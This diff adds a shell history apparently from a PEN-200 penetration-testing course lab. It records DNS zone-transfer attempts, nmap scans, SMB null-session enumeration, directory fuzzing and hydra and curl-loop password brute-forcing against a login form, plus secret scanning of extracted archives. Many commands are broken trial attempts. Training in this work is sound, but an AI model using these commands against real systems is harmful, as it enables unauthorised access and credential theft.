@@ -1,0 +1,999 @@
+  772  ssh student@$IP -p 2222 -o "UserKnownHostsFile=/dev/null" | tee 7.1.7.vm1.script
+  773  export IP=192.168.133.149
+  774  host $ip
+  775  for ipaddr in $( seq 1 149 ); do; host 192.168.133.$ipaddr; done; | grep -v "not found"
+  776  for ipaddr in $( seq 1 149 ); do;  host 192.168.133.$ipaddr; done;| grep -v "not found"
+  777  for ipaddr in $( seq 1 149 ); do;  host 192.168.133.$ipaddr; done;"\n
+  778  for ipaddr in $( seq 1 149 ); do;  host 192.168.133.$ipaddr; done;
+  779  for ipaddr in $( seq 1 149 ); do;  echo "checking $ipaddress"; host 192.168.133.$ipaddr; done;
+  780  for ipaddr in $( seq 01 149 ); do;  echo "checking $ipaddr"; host 192.168.133.$ipaddr; done;
+  781  for ipaddr in $( seq -w 01 149 ); do;  echo "checking $ipaddr"; host 192.168.133.$ipaddr; done;
+  782  for ipaddr in $( seq -w 1 149 ); do;  echo "checking $ipaddr"; host 192.168.133.$ipaddr; done;
+  783  for ipaddr in $( seq -w 01 10); do;  echo "checking $ipaddr"; host 192.168.133.$ipaddr; done;
+  784  for ipaddr in $( seq 1 10); do;  echo "checking $ipaddr"; host 192.168.133.$ipaddr; done;
+  785  for ipaddr in $( seq 1 10); do;  echo "checking 192.168.133.$ipaddr"; host 192.168.133.$ipaddr; done;
+  786  for ipaddr in $( seq 149 1); do;  echo "checking 192.168.133.$ipaddr"; host 192.168.133.$ipaddr; done;
+  787  host 192.168.133.149
+  788  for ipaddr in $( seq 149 1); do;  echo "checking 192.168.133.$ipaddr"; host 192.168.133.$ipaddr; done; >> ipaddressscan.txt
+  789  for ipaddr in $( seq 1 149); do;  echo "checking 192.168.133.$ipaddr"; host 192.168.133.$ipaddr; done; >> ipaddressscan.txt
+  790  host -t ns google.com | cut -d " " -f 4
+  791  for ip in $( cat /SecLists/master/Discovery/DNS/namelist.txt ); do host $ip.megacorpone.com; done
+  792  find seclists
+  793  find SecLists
+  794  find / SecLists
+  795  find / "SecLists"
+  796  find / namelist.txt
+  797  find --help
+  798  find / -type f namelist.txt
+  799  find / namelist.txt -type f
+  800  cd seclist
+  801  cd seclists
+  802  sudo apt install seclists
+  803  cd tools
+  804  chmod +x dns.axfr.sh
+  805  ./dns.axfr.sh megacorpone.com
+  806  dnsrecon -d megacorpone.com -t axfr
+  807  dnsrecon man
+  808  dnsenum megacorpone.com
+  809  for ip in $( seq 50 100 ); do; host 192.168.176.$ip; done;| grep -v "not found"
+  810  for ip in $( seq 50 100 ); do;  host 192.168.176.$ip; done; | grep -v "not found"
+  811  for ip in $( seq 50 100 ); do;  host 192.168.176.$ip; done; |grep -v "not found"
+  812  for ip in $( seq 50 100 ); do;  host 192.168.176.$ip; done
+  813  for ip in $( seq 1 30 ); do;  host 192.168.176.$ip; done
+  814  for ip in $( seq 1 30 ); do; echo "checking host 192.168.176.$ip"; host 192.168.176.$ip;  done
+  815  host 192.168.176.1
+  816  whois 192.168.176.1
+  817  host 192.168.176.255
+  818  host --help
+  819  host -v -a 192.168.176.149 
+  820  ping 192.168.176.1
+  821  for ip in $( seq 1 255 ); do; host 192.168.176.$ip; done; 
+  822  sudo for ip in $( seq 1 255 ); do; host 192.168.176.$ip; done; 
+  823  for ip in $( seq 1 255 ); do; sudo host -v 192.168.176.$ip; done; 
+  824  for ip in $( seq 1 255 ); do; sudo host -v -W 1 192.168.176.$ip; done; 
+  825  for ip in $( seq 1 255 ); do; sudo host -v -W 3 192.168.176.$ip; done; 
+  826  dig 172.17.224.1
+  827  nmtool
+  828  nm-tool
+  829  hostname 192.168.176.5
+  830  host 192.168.176.5
+  831  ping 172.17.224.1
+  832  netstat
+  833  netstat -lntu
+  834  dnsenum --help
+  835  ( nmcli dev list || nmcli dev show ) 2>/dev/null | grep DNS
+  836  host 172.17.224.1\n
+  837  netstat -luntp
+  838  sudo netstat -luntp
+  839  nmap -v -p 53
+  840  nmap -v -p 53 192.168.176.1-255
+  841  ping 192.168.176.49
+  842  ping 192.168.176.149
+  843  nano -ilm /etc/resolv.conf
+  844  sudo systemctl status systemd-resolved.service
+  845  dnsrecon -d ForestDnsZones.mailman.com
+  846  dnsrecon -d _ldap._tcp.ForestDnsZones.mailman.com
+  847  dnsrecon -d _ldap._tcp.ForestDnsZones.mailman.com -t axf
+  848  dnsrecon -d _ldap._tcp.ForestDnsZones.mailman.com -t axfr
+  849  dnsrecon -d ForestDnsZones.mailman.com -t axfr
+  850  dnsrecon -d inami-riziv.mailman.com -t axfr
+  851  dnsrecon -d inami-riziv.mailman.com
+  852  dnsrecon DomainDnsZones.mailman.com
+  853  dnsrecon -d DomainDnsZones.mailman.com
+  854  nmap -v mailman.com
+  855  dnsrecon -d cap.mailman.com
+  856  dnsrecon -d mailman -t axfr 
+  857  dnsrecon -d mailman.com -t axfr 
+  858  dig mailman.com ANY
+  859  dig mailman.com A
+  860  dig hostmaster.mailman.com ANY
+  861  dig hostmaster.mailman.com +short
+  862  host 192.168.176.149
+  863  host 192.168.176.254
+  864  ping 192.168.176.254
+  865  dig 192.168.176.149
+  866  nmap -v -p 53 192.168.176.1-255 > vm1.nmap
+  867  host dc.MAILMAN.com
+  868  dnsrecon -d dc.MAILMAN.com -t axfr >> dc.MAILMAN.com.dnsrecon
+  869  dnsrecon -d dc.MAILMAN.com > dc.MAILMAN.com.dnsrecon
+  870  dnsrecon -d dc.MAILMAN.com > dc.MAILMAN.com.2.dnsrecon
+  871  dnsrecon -d dc.MAILMAN.com -t axfr >> dc.MAILMAN.com.2.dnsrecon
+  872  dnsrecon -d dc.MAILMAN.com
+  873  dnsrecon -d dc.MAILMAN
+  874  dnsrecon -d MAILMAN.com
+  875  dnsrecon -d MAILMAN.com -t axfr >> MAILMAN.com.2.dnsrecon
+  876  dig mailman.com -t +short
+  877  dig mailman.com +short
+  878  host -l mailman.com
+  882  dnsrecon -d mailman.com -n  192.168.176.149
+  884  dnsrecon -d  _kerberos._tcp.mailman.com
+  885  dnsrecon -d  _ldap._tcp.mailman.com
+  886  dnsrecon -d  _gc._tcp.mailman.com
+  887  host -l mailman.com dc.mailman.co
+  891  sudo systemctl restart systemd-resolved.service
+  892  sudo systemctl restart resolved
+  896  nameserver 8.8.8.8
+  900  dig ns2.mytrafficmanagement.com
+  901  dig ns1.mytrafficmanagement.com
+  902  host -l mailman.com ns1.trafficmanagement.com
+  907  dig dvkxrtmtogrw.mailman.com
+  908  dig -t txt dvkxrtmtogrw.mailman.com
+  909  dig -t a dvkxrtmtogrw.mailman.com
+  911  git commit -m "pen200 active recon"
+  914  git clone https://github.com/securing/DumpsterDiver
+  917  dnsrecon -d ns2.mytrafficmanagement.com -t axfr
+  918  host -t ns mailman.com
+  919  host -l mailman.com ns1.mytrafficmanagement.com
+  920  host -l mailman.com ns2.mytrafficmanagement.com
+  923  cd /mnt/hgfs/sharedfolder/stucqadminportalaeprd
+  927  rm -d stucqadminportalaeprd
+  928  rm -d -f stucqadminportalaeprd
+  929  rm -d -r stucqadminportalaeprd
+  932  ls -la | grep "*.7z"
+  934  ls -la | grep "7z"
+  935  ls -l | grep "7z"
+  936  ls --help
+  937  ls -1 *.7z
+  938  ls -l | grep "7z" | sed "s/.7z//"
+  939  ls -1 *.7z | sed "s/.7z//"
+  940  for z in $( ls -1 *.7z | sed "s/.7z//" ); do; mkdir $1; cp $1.7z $1; 7z x -y /$1/$1.7z -o /mnt/hgfs/sharedfolder/$1; done;
+  941  for z in $( ls -1 *.7z | sed "s/.7z//" ); do; mkdir $1; cp $1.7z $1; 7z x -y /$1/$1.7z -o/mnt/hgfs/sharedfolder/$1; done;
+  943  cd scanit
+  944  kali-tweaks
+  945  sudo mount-shared-folders
+  948  cd DumpsterDiver
+  950  pip3 install requirements.txt
+  951  pip3 install -r requirements.txt
+  952  python3 DumpsterDiver.py -p //mnt/hgfs/sharedfolder/stucqadminportalaeprd
+  953  python3 DumpsterDiver.py -p /mnt/hgfs/sharedfolder/stucqadminportalaeprd
+  955  cat /mnt/hgfs/sharedfolder/stucqadminportalaeprd/stucqadminportalaeprd/$web/vendors.299d7a2dea3b76edd143.js
+  956  cat /mnt/hgfs/sharedfolder/stucqadminportalaeprd/stucqadminportalaeprd/web/vendors.299d7a2dea3b76edd143.js
+  957  cat '/mnt/hgfs/sharedfolder/stucqadminportalaeprd/stucqadminportalaeprd/web/vendors.299d7a2dea3b76edd143.js'
+  958  cat '/mnt/hgfs/sharedfolder/stucqadminportalaeprd/stucqadminportalaeprd/$web/vendors.299d7a2dea3b76edd143.js'
+  960  python3 DumpsterDiver.py --help
+  961  python3 DumpsterDiver.py -p /mnt/hgfs/sharedfolder/stucqadminportalaeprd -s
+  962  7z --help
+  963  python3 DumpsterDiver.py -p /mnt/hgfs/sharedfolder/scanit -s
+  964  python3 DumpsterDiver.py -p /mnt/hgfs/sharedfolder/scanit -s >> /home/kali/dumpsterdiver.results
+  965  cd ~
+  967  cp dumpsterdiver.results /mnt/hgfs/sharedfolder/
+  968  gunzip StorageAccounts.zip
+  969  ./StorageAccounts.zip
+  970  unzip StorageAccounts.zip
+  971  ls -;a
+  973  mkdir stucqadminportalaeprd
+  974  cp stucqadminportalaeprd.7z stucqadminportalaeprd/
+  975  ls -pa
+  977  cd stucqadminportalaeprd
+  979  gunzip stucqadminportalaeprd.7z
+  980  unzip stucqadminportalaeprd.7z
+  981  p7zip stucqadminportalaeprd.7z
+  982  p7zip --help
+  983  p7zip -d stucqadminportalaeprd.7z
+  986  dig 192.168.150.149
+  987  ping 194.195.216.90\n
+  988  ping ns1.mytrafficmanagement.com
+  989  ping ns2.mytrafficmanagement.com
+  990  dig dc.mailman.com @192.168.150.149
+  991  dig mailman.com @192.168.150.149
+  992  dig axfr mailman.com
+  993  dig axfr dc.mailman.com @192.168.150.149
+  994  dig txt dc.mailman.com @192.168.150.149
+  995  dig txt mailman.com @192.168.150.149
+  996  dig txt mailman.com @hostmaster.mailman.com
+  997  dig txt hostmaster.mailman.com @192.168.150.149
+  998  dig txt hostmaster.mailman.com
+  999  dig txt admin.giantpanda.com
+ 1000  dig admin.gaintpanda.com
+ 1001  dig --help
+ 1002  dig -h
+ 1003  dig admin.gaintpanda.com txt
+ 1004  dig dns.jomax.net txt
+ 1005  dig 192.168.125.149 
+ 1006  ping 192.168.125.149
+ 1007  nslookup 192.168.125.149
+ 1008  host 192.168.125.149
+ 1009  dig -d mailman.com @192.168.125.149
+ 1010  dig any -d mailman.com @192.168.125.149
+ 1011  dig any -d mailman.com dc.mailman.com
+ 1012  dig -t any mailman.com
+ 1013  dig hostmaster.mailman.com
+ 1014  dnsrecon -d mailman.com 
+ 1015  dnsrecon -d mailman.com any
+ 1016  dnsrecon -d mailman.com -t txt
+ 1017  dig mailman.com  hostmaster.mailman.com
+ 1018  dig mailman.com  hostmaster.mailman.com -type a
+ 1019  ping hostmaster.mailman.com
+ 1020  nslookup mailman.com
+ 1021  nslookup dc.mailman.com
+ 1022  dig dc.mailman.com
+ 1023  dnsrecon -d mailman.com -t any
+ 1024  dnsrecon --help
+ 1025  dnsrecon -d mailman.com -t std
+ 1026  dnsrecon -d domaindnszones.mailman.com
+ 1027  dnsrecon -d domaindnszones.mailman.com axfr
+ 1028  dnsrecon -d domaindnszones.mailman.com -t axfr
+ 1029  dnsrecon -d forrestdnszones.mailman.com -t axfr
+ 1030  dnsrecon -d forrestdnszones.mailman.com -t std
+ 1031  dnsrecon -d domaindnszones.mailman.com -t std
+ 1032  dig mailman.com
+ 1033  dnsrecon -d hostmaster.mailman.com -t std
+ 1034  ping mailman.com
+ 1035  dnsrecon -d hostmaster.mailman.com -t axfr
+ 1036  dnsrecon -d dc.mailman.com -t axfr
+ 1037  dig -d forestdnszones.mailman.com
+ 1038  dig -d forestdnszones.mailman.com -t axfr
+ 1039  dig -d forestdnszones.mailman.com -t std
+ 1040  dig _msdcs.mailman.com -t std
+ 1041  dig _msdcs.mailman.com -t txt
+ 1045  nmap -v 192.168.125.0/24 > vm3.nmap
+ 1046  nmap -v -p 53 192.168.125.0/24 > vm3.nmap
+ 1047  dnsenum 192.168.125.149
+ 1048  dnsenum 192.168.125.0/24 -t axfr
+ 1049  host -l _msdcs.mailman.com dc.mailman.com
+ 1050  dnsenum -h
+ 1051  host -l mailman.com @dc.mailman.com
+ 1052  host -l mailman.com @192.168.125.149
+ 1053  dig 192.168.125.149 any
+ 1054  dig -x 192.168.125.149
+ 1055  for ip in $( seq 1 255 ); do; sudo host -v -W 3 192.168.125.$ip; done; 
+ 1056  host -v -W 3 192.168.145.149
+ 1057  nslookup 192.168.125.140
+ 1058  host -l mailman.com dc.mailman.com
+ 1059  dig axfr _msdcs.mailman.com @192.168.125.149 
+ 1060  dig axfr mailman.com @192.168.125.149 
+ 1062  nmap -v -p 53 192.168.125.0/24
+ 1063  nslookup 
+ 1064  for ip in $( seq 1 255 ); do; nslookup 192.168.125.$ip; done; 
+ 1065  host 192.168.125.254
+ 1066  dig axfr mailman.com @192.168.125.254
+ 1067  dnsrecon -d mailman.com
+ 1068  dnsrecon -d mailman.com -t axfr
+ 1070  ./dns.axfr.sh mailman.com
+ 1071  dnsrecon 192.168.125.254
+ 1072  dnsrecon -d mailman.com -n 192.168.125.254
+ 1073  dnsrecon -d mailman.com -n 192.168.125.254 any
+ 1074  dnsrecon -r 192.168.125.0/24 -n 192.168.125.254 any
+ 1075  dnsenum mailman.com
+ 1076  cp vm2.namp /home/kali/Documents/git/bravo/offsec/pen200/7
+ 1077  cp vm2.namp /home/kali/Documents/git/bravo/offsec/pen200/7/vm2.nmap
+ 1078  cd Documents/git/bravo/offsec/pen200/7
+ 1080  nmap -v -p 53 192.168.150.1-255 > vm2.nmap
+ 1081  host 192.168.150.149
+ 1082  nslookup nmap -v -p 53 192.168.150.1-255 > vm2.nmap  
+ 1083  nslookup 192.168.150.149
+ 1084  ping dc.MAILMAN.com
+ 1085  sudo nano -ilm /etc/host
+ 1086  nmap -v -p 53 192.168.125.1-255 > vm2.nmap 
+ 1087  cat vm2.nmap
+ 1089  nslookup --help
+ 1090  nslookup -help
+ 1091  man nslookup
+ 1092  host -l mailman.com 192.168.125.254
+ 1093  host  mailman.com 192.168.125.254
+ 1094  host  hostmaster.mailman.com 192.168.125.254
+ 1095  sudo nano -ilm /etc/resolv.conf
+ 1096  nslookup hostmaster.mailman.com 192.168.125.254
+ 1098  for ip in $( seq 1 255 ); do; sudo host 192.168.176.$ip; done; 
+ 1099  for ip in $( seq 1 255 ); do; sudo host 192.168.176.$ip 192.168.125.254; done; 
+ 1100  host -t a mailman.com
+ 1101  for ip in $( seq 1 255 ); do; host 192.168.125.$ip 192.168.125.254; done; | grep -v "not found" 
+ 1102  for ip in $( seq 1 255 ); do; host 192.168.125.$ip 192.168.125.254; done; |grep -v "not found" 
+ 1103  for ip in $( seq 1 255 ); do; host 192.168.125.$ip 192.168.125.254; done |grep -v "not found" 
+ 1104  for ip in $( seq 1 255 ); do; host 192.168.125.$ip 192.168.125.254; done | grep -v "not found" 
+ 1107  sudo nano -ilm /etc/hosts
+ 1108  nslookup -type ns MAILMAN.com
+ 1109  nslookup -t ns MAILMAN.com
+ 1110  nslookup
+ 1111  dig axfr dc.mailman.com @dc.mailman.com
+ 1112  dig axfr dc.mailman.com @192.168.125.149
+ 1113  dig axfr mailman.com @192.168.125.149
+ 1114  dig axfr _msdcs.mailman.com @192.168.125.149
+ 1115  cd bravo
+ 1117  git commit -m "more update"
+ 1121  set IP=192.168.143.52
+ 1127  nmap -v -p 6400-65535 $IP
+ 1128  nmap -v -p 65000-65535 $IP
+ 1129  nmap -v -p 60000-64000 $IP
+ 1130  nc -nv $IP 60337
+ 1131  nc -nv $IP 63004
+ 1132  nc -nv $IP 63186
+ 1133  nmap -v -p 60000-64000 $IP -sV -A
+ 1135  nmap --help
+ 1136  nmap -v -p 60000-64000 $IP -sV -A -sC -O -A
+ 1137  sudo nmap -v -p 60000-64000 $IP -sV -A -sC -O -A
+ 1138  sudo nmap -v -p 64000-65535 $IP -sV -sC -O
+ 1139  sudo nmap -v -p 64000-65535 $IP -sV -sC
+ 1140  sudo nmap -v -p 64000-65535 $IP -sV
+ 1141  sudo nmap -v -p 64000-65535 $IP -sC
+ 1142  sudo nmap -v -sC -p 64000-65535 $IP
+ 1143  sudo nmap -v -p 64000-65535 $IP
+ 1144  sudo nmap -v -p 61000-65535 $IP
+ 1145  sudo nmap -v -sV -sT -p 61000-65535 $IP
+ 1146  sudo nmap -v -sV -sC -p 61000-65535 $IP
+ 1147  sudo nmap -v -sV -sC $IP
+ 1148  nc -nv $IP 2222
+ 1149  ssh $ip -p 2222
+ 1150  ssh anon@$ip -p 2222
+ 1151  ssh anon:$ip -p 2222
+ 1152  ssh $ip -p 22
+ 1153  ssh $ip:22
+ 1154  ssh -bind $ip:22
+ 1155  sudo nmap -vv -sV -sC $IP
+ 1156  nc $ip 22
+ 1157  nc $ip -p 22
+ 1158  nc -nv $IP 22
+ 1159  sudo nmap -vv -sV -sC -p 60000 65535 $IP 
+ 1161  sudo nmap -vv -sV -sC -p 60000-65535 $IP 
+ 1162  sudo nmap -vv -sV -sC -p 1-65535 $IP 
+ 1163  sudo nmap -vv -sV -sC -p 50000-65535 $IP 
+ 1165  sudo apt install masscan
+ 1167  nmap $IP
+ 1168  nmap $IP -p 50000-65335
+ 1170  nmap $IP -p50000-65335
+ 1171  nmap $IP -Pn -A -p 50000-65335
+ 1172  export IP=192.168.143.52
+ 1173  nmap -v -p 60000-65335 $IP -sV -A -sC -O -A
+ 1174  root nmap -v -p 60000-65335 $IP -sV -A -sC -O -A
+ 1175  sudo  nmap -v -p 60000-65335 $IP -sV -A -sC -O -A
+ 1176  sudo  nmap  $IP
+ 1177  nc -nv $IP -p 2222
+ 1178  nmap -n -sV --script enip-info -p 2222 $IP
+ 1179  nc $IP -p 2222
+ 1181  netcat -v $IP 2222
+ 1182  netcat -vv $IP 2222
+ 1183  netcat -nvv $IP 2222
+ 1184  nmap -T4 -sS --open -p 1024-56535 $IP
+ 1185  sudo nmap -T4 -sS --open -p 1024-56535 $IP
+ 1186  sudo nc -nv $IP 2222
+ 1188  sudo nc -nv 192.168.143.52 2222
+ 1189  sudo nc -nvlp 2222
+ 1190  nmap -T4 -sS --open -p 1024-65535 $IP
+ 1191  sudo nmap -T4 -sS --open -p 1024-65535 $IP
+ 1192  nc -nv $IP -p 59811
+ 1193  nc -nv $IP 59811
+ 1195  git commit -m "slowly slowly"
+ 1201  cat enum4linux.txt
+ 1202  Username ......... ''
+ 1203  Password ......... ''
+ 1204  Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+ 1205  [+] Got domain/workgroup name: WORKGROUP                                                                                                                                                    
+ 1206  [+] Server 192.168.165.20 allows sessions using username '', password ''                                                                                                                    
+ 1207  Domain Name: WORKGROUP                                                                                                                                                                      
+ 1208  Domain Sid: (NULL SID)
+ 1210  git commit -m "getting closer"
+ 1212  nmap -t4 --script=http-title 192.168.165.1-254 \n
+ 1213  nmap -t 4 --script=http-title 192.168.165.1-254 \n
+ 1214  nmap -T4 --script=http-title 192.168.165.1-254 \n
+ 1215  nmap -T4 --script=http-title --open 192.168.165.1-254 \n
+ 1216  nmap -h
+ 1217  nmap -T4 -sV --script=http-title --open 192.168.165.1-254 \n
+ 1218  nmap -v -p 139, 445 --script=smb-os-discovery 192.168.165.1-254\n
+ 1219  nmap -v -p 139, 445 --open --script=smb-os-discovery 192.168.165.1-254\n
+ 1220  enum4linux
+ 1221  nmap -v -p 139, 445 --open --script=smb-os-discovery 192.168.165.1-254 -oG\n
+ 1222  nmap -v -p 139, 445 --open --script=smb-os-discovery 192.168.165.1-254 -oG smb.txt\n
+ 1224  cat smb.txt | awk -F " " '{print $1}' 
+ 1225  cat smb.txt | awk -F " " '{print $2}' 
+ 1226  cat smb.txt | awk -F " " '{print $2}' | u
+ 1227  cat smb.txt | awk -F " " '{print $2}' | uniq
+ 1228  cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap", "Ports"
+ 1229  cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" 
+ 1230  cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" -v "Ports"
+ 1231  cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap|Ports"
+ 1232  cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports"
+ 1233  for ( i in ( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ) ); do; echo $i, 'something'; done;
+ 1234  for i in ( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; echo $i, 'something'; done;
+ 1235  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; echo $i, 'something'; done;
+ 1236  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; enum4linux $i ; done;
+ 1237  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; enum4linux -U $i ; done; 
+ 1238  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; enum4linux -U $i | grep "Arthur"; done; 
+ 1239  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; enum4linux -U $i | grep "alfred"; done; 
+ 1240  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; enum4linux -U $i >> enum4linux.txt; done; 
+ 1241  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; enum4linux -U -k alfred $i >> enum4linux.txt; done; 
+ 1242  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; enum4linux -U -k alfred $i; done; 
+ 1243  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" ); do; enum4linux -k alfred $i >> /home/kali/Documents/git/bravo/offsec/pen200/7/enum2.txt; done; 
+ 1244  cat smb.txt
+ 1245  for i in $( cat smb.txt | awk -F " " '{print $2}' | uniq | grep -v "Nmap" | grep -v "Ports" | sort ); do; enum4linux $i >> /home/kali/Documents/git/bravo/offsec/pen200/7/enum3.txt; done; 
+ 1247  ls 
+ 1248  chmod +x Nessus-10.4.2-ubuntu1404_amd64.deb
+ 1249  sudo apt install --help
+ 1250  sudo apt install ./Nessus-10.4.2-ubuntu1404_amd64.deb
+ 1251  /bin/systemctl start nessusd.service
+ 1255  curl http://$IP/sitemap.xml
+ 1256  curl http://$IP/flagEE94C84BE6EC.html
+ 1257  curl http://$IP/flagF1FE4DEFCB.html
+ 1261  curl http://$IP/?flag=%4f%53%7b%39%34%65%31%62%38%61%32%38%39%32%31%65%38%33%62%31%35%34%62%32%61%31%62%38%66%33%33%32%30%36%38%7d
+ 1263  set IP=192.168.162,52
+ 1264  dirb http://$IP -z 10
+ 1265  dirb http://$IP
+ 1272  curl -o passwords.txt http://$IP/passwords.txt
+ 1274  cat passwords.txt
+ 1275  for i in $( cat passwords.txt ); do; \n\ncurl -i -s -k -X $'POST' \\n    -H $'Host: 192.168.162.52' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 37' -H $'Origin: http://192.168.162.52' -H $'Connection: close' -H $'Referer: http://192.168.162.52/' -H $'Upgrade-Insecure-Requests: 1' \\n    --data-binary $'username=admin&password=$1&debug=0' \\n    $'http://192.168.162.52/login.php';\ndone;\n
+ 1276  for i in $( cat passwords.txt ); do; \necho $1;\ncurl -i -s -k -X $'POST' \\n    -H $'Host: 192.168.162.52' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 37' -H $'Origin: http://192.168.162.52' -H $'Connection: close' -H $'Referer: http://192.168.162.52/' -H $'Upgrade-Insecure-Requests: 1' \\n    --data-binary $'username=admin&password=$1&debug=0' \\n    $'http://192.168.162.52/login.php';\ndone;
+ 1277  [200~for i in $( cat passwords.txt ); do; 
+ 1278  echo $i;
+ 1279  curl -i -s -k -X $'POST' \\n    -H $'Host: 192.168.162.52' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 37' -H $'Origin: http://192.168.162.52' -H $'Connection: close' -H $'Referer: http://192.168.162.52/' -H $'Upgrade-Insecure-Requests: 1' \\n    --data-binary $'username=admin&password=$i&debug=0' \\n    $'http://192.168.162.52/login.php';
+ 1280  for i in $( cat passwords.txt ); do; \necho $i;\ncurl -i -s -k -X $'POST' \\n    -H $'Host: 192.168.162.52' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 37' -H $'Origin: http://192.168.162.52' -H $'Connection: close' -H $'Referer: http://192.168.162.52/' -H $'Upgrade-Insecure-Requests: 1' \\n    --data-binary $'username=admin&password=$i&debug=0' \\n    $'http://192.168.162.52/login.php';\ndone;
+ 1281  curl -h
+ 1282  for i in $( cat passwords.txt ); do; \necho 'username=admin&password=$i&debug=0';\ncurl -i -s -k -X $'POST' \\n    -H $'Host: 192.168.162.52' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 37' -H $'Origin: http://192.168.162.52' -H $'Connection: close' -H $'Referer: http://192.168.162.52/' -H $'Upgrade-Insecure-Requests: 1' \\n    --data-binary $'username=admin&password=$i&debug=0' \\n    $'http://192.168.162.52/login.php';\ndone;
+ 1283  for i in $( cat passwords.txt ); do; \necho 'username=admin&password=$i&debug=0';\n$( curl -i -s -k -X $'POST' \\n    -H $'Host: 192.168.162.52' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 37' -H $'Origin: http://192.168.162.52' -H $'Connection: close' -H $'Referer: http://192.168.162.52/' -H $'Upgrade-Insecure-Requests: 1' \\n    --data-binary $'username=admin&password=$i&debug=0' \\n    $'http://192.168.162.52/login.php' );\ndone;
+ 1285  dirb
+ 1286  hydra 
+ 1287  sudo hydra -l admin -P passwords.txt $IP http-post-form "/login.php:username=admin&password=^PASS^:Login Failed\n\n"
+ 1288  sudo hydra -l admin -P passwords.txt $IP http-post-form "/login.php:username=admin&password=^PASS^"
+ 1289  sudo hydra -l admin -P passwords.txt $IP http-post-form "/login.php:username=admin&password=^PASS^:<h2>Login Failedwould try another combo. Hopefully, you are not trying these by hand.</p>"
+ 1290  sudo hydra -l admin -P passwords.txt $IP http-post-form "/login.php:username=admin&password=^PASS^:<h2>Login Failed</h2><p>I would try another combo. Hopefully, you are not trying these by hand.</p>"
+ 1291  sudo hydra -l admin -P passwords.txt $IP http-post-form "/login.php:username=admin&password=^PASS^&debug=0:Login Failed\n\n"
+ 1292  sudo hydra -l admin -P passwords.txt $IP http-post-form "/login.php:username=admin&password=^PASS^&debug=0:Login Failed" -v
+ 1295  git commit -m "started web application attacks"
+ 1298  dirb --help
+ 1299  dirb -h
+ 1301  ffuf -u http://$IP -w /usr/share/dirb/wordlists/common.txt
+ 1302  ffuf -u http://$IP/FUZZ -w /usr/share/dirb/wordlists/common.txt
+ 1303  curl http://$IP/portal
+ 1304  curl http://$IP/portal/
+ 1305  curl http://$IP/passwords.txt
+ 1306  sudo systemctl /etc/init.d/nessusd start
+ 1307  systemctl enable --now nessusd
+ 1308  systemctl status nessusd
+ 1309  sudo /etc/init.d/nessusd start
+ 1310  sudo /usr/lib/systemd/system/nessusd.service start
+ 1311  sudo /usr/lib/systemd/system/nessusd.service/nessusd start
+ 1312  which nessus
+ 1313  find / -iname "nessus"
+ 1314  find / -iname "nessus" 2>/dev/null
+ 1315  ls /opt/nessus/lib/nessus
+ 1316  /etc/init.d/nessusd start
+ 1317  sudo service nessusd start
+ 1318  update-rc.d nessusd enable
